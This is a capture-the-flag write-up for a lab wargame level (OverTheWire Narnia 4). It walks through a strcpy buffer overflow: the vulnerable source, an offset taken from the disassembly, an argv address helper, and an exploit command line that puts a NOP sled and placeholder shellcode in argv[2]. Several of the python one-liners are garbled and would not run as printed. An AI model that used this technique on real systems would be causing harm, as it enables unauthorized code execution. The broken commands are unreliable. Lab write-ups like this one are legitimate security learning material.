# OverTheWire — Narnia Level 4 → 5

> Goal: Get narnia5 password from `narnia4`. Result: **`**********`** (hidden)
> Technique: `strcpy` overflow → EIP; `environ` is wiped → put shellcode in **`argv[2]`**.

---

## 1. Connection
```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
extern char **environ;
int main(int argc,char **argv){
    int i; char buffer[256];
    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));   // ZERO OUT ALL env
    if(argc>1) strcpy(buffer, argv[1]);                 // BUG: overflow
}
```

## 3. Vulnerability + key observation
Since `environ` is wiped, you can't put shellcode in EGG. **But `argv` is NOT wiped** →
put shellcode in `argv[2]`. **Important:** wiping env contents doesn't change stack
ADDRESSES (strings are zeroed in place) → address-finding helper is still valid even after env is wiped.

## 4. Offset — from disasm (**VERIFIED = 264**)
```
08049189:  sub  esp, 0x104           ; 260 byte frame
...
80491f2:   lea  eax, [ebp-0x104]     ; buffer = ebp-0x104 (256) ; i = ebp-0x4
80491f9:   call strcpy@plt
```
`buffer = ebp-0x104`, saved EIP at `ebp+4` → distance = `0x104 + 4 = **264**`.

## 5. argv[2] address
Find `argv[2]`'s stack address using a helper run with **the same argv lengths**:
```c
int main(int c,char**v){ printf("ADDR=%p\n",(void*)v[2]); return 0; }   // 15-char path
```

## 6. Exploit
```bash
cd /tmp
ARGV2=$(python3 -c 'b"\x90"*20000 + SHELLCODE_57')         # sled + setreuid/execve
DUMMY=$(python3 -c 'b"A"*268')                             # same length as argv[1] (264+4)
ADDR=$(/tmp/argvaddr12 "$DUMMY" "$ARGV2" | ...)            # argv[2] address (e.g. ffff877d)
RET=$((0x$ADDR + 10000))
# argv[1] = "A"*264 + RET ; argv[2] = sled+shellcode
# env WIPED -> spawned shell has no PATH -> use ABSOLUTE paths: /bin/cat, /usr/bin/id
python3 -c 'timed: "/usr/bin/id; /bin/cat /etc/narnia_pass/narnia5"' | \
  /narnia/narnia4 "$(python3 -c "b'A'*264 + pack('<I', RET)")" "$ARGV2"
```
Output: `ADDR=ffff877d RET=ffffae8d` → `uid=14005(narnia5)` → password. (Worked first try.)



## Lessons
| Topic | Note |
|-------|------|
| env wipe | EGG unusable → shellcode goes in `argv[2]` (not wiped) |
| Offset 264 | `buffer=ebp-0x104` → 260+4 |
| addresses unchanged | Even after env content is wiped, stack addresses stay the same → helper valid |
| No PATH | After env wipe the shell has no PATH → **absolute paths** (`/bin/cat`, `/usr/bin/id`) |
